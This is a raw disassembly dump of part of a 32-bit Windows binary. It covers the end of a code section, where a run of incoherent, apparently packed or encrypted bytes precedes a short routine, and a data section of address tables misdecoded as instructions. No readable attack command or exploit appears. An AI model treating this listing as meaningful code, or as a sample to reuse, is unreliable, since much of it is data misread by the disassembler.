  412b27:	sbb    dl,BYTE PTR [esi]
  412b29:	push   0xc6fa0d2c
  412b2e:	test   ecx,0xc5f78041
  412b34:	xchg   ecx,eax
  412b35:	int    0xa9
  412b37:	ins    DWORD PTR es:[edi],dx
  412b38:	xchg   bh,ah
  412b3a:	jmp    0x412b88
  412b3c:	nop
  412b3d:	sbb    DWORD PTR ds:0xfd6b27ea,edi
  412b43:	mov    ds:0xad2ad7f0,al
  412b48:	jnp    0x412ae7
  412b4a:	repz mov dh,0xd4
  412b4d:	mov    dl,0xab
  412b4f:	push   0xb0292433
  412b54:	stos   BYTE PTR es:[edi],al
  412b55:	or     dl,0xb4
  412b58:	cmp    eax,0x7dab2a6b
  412b5d:	jecxz  0x412b77
  412b5f:	or     DWORD PTR [edx+0x58],esp
  412b62:	sub    al,0xd2
  412b64:	idiv   BYTE PTR [eax-0x789eb316]
  412b6a:	rcl    DWORD PTR [ecx-0x6f],cl
  412b6d:	pop    ecx
  412b6e:	mov    dh,0xcf
  412b70:	stos   DWORD PTR es:[edi],eax
  412b71:	and    BYTE PTR [esi],bh
  412b73:	imul   ecx
  412b75:	add    ch,BYTE PTR [edi+0xd]
  412b78:	ret    0xf9f3
  412b7b:	stos   DWORD PTR es:[edi],eax
  412b7c:	fwait
  412b7d:	jp     0x412b4e
  412b7f:	test   BYTE PTR [eax-0x6e792c64],ah
  412b85:	loope  0x412b6d
  412b87:	int    0xd9
  412b89:	add    edi,0x3c
  412b8c:	(bad)  
  412b8d:	inc    eax
  412b8e:	nop
  412b8f:	aaa    
  412b90:	nop
  412b91:	test   BYTE PTR [esi+0x39b78b77],bh
  412b97:	(bad)  
  412b98:	pushf  
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	cld    
  412b9b:	push   ds
  412b9c:	rol    edx,1
  412b9e:	pop    ds
  412b9f:	cmc    
  412ba0:	aad    0xfc
  412ba2:	dec    eax
  412ba3:	iret   
  412ba4:	pop    ebp
  412ba5:	outs   dx,BYTE PTR ds:[esi]
  412ba6:	cmp    BYTE PTR [ebx+0x6],ah
  412ba9:	loop   0x412b77
  412bab:	xchg   ebx,eax
  412bac:	mov    eax,ds:0x7ea57046
  412bb1:	add    BYTE PTR [ebx-0x64],dl
  412bb4:	pop    ebp
  412bb5:	retf   
  412bb6:	in     al,dx
  412bb7:	mov    ebx,0xcbae030c
  412bbc:	(bad)  
  412bbd:	cmp    dh,BYTE PTR [ecx-0x1d95d1e5]
  412bc3:	and    BYTE PTR [edx+eiz*8],bl
  412bc6:	sub    DWORD PTR [edx],0xffffffe8
  412bc9:	push   eax
  412bca:	mov    ds:0x44e06cc4,eax
  412bcf:	das    
  412bd0:	and    al,0xec
  412bd2:	xchg   BYTE PTR [ebx-0x59bab3f1],dh
  412bd8:	xlat   BYTE PTR ds:[ebx]
  412bd9:	fnsave [ecx*2+0x5b046a32]
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0xc3000000
  413429:	dec    ecx
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	ret    
  41342d:	cmp    eax,DWORD PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
